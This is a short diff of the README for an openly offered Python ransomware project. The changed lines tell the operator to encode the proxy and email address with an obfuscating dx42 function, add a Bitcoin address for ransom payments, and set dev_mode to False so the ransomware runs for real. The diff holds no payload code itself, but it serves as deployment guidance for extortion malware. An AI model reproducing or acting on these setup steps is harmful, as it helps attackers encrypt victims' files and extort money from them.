@@ -24,7 +24,10 @@ Ransomware written in Python 💀💀💀
   YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
   ```
 * Replace `YOUR_BITCOIN_ADDRESS` with your actual Bitcoin address string.
-* Replace `YOUR_EMAIL_ADDRESS` with your actual email address string.
+* Replace `YOUR_EMAIL_ADDRESS` similarly with your encoded email address. 
+  ```python 
+  YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()   
+  ```
 * Set `dev_mode = False` to disable development mode.
 * Install the required packages with the following command:
   ```bash
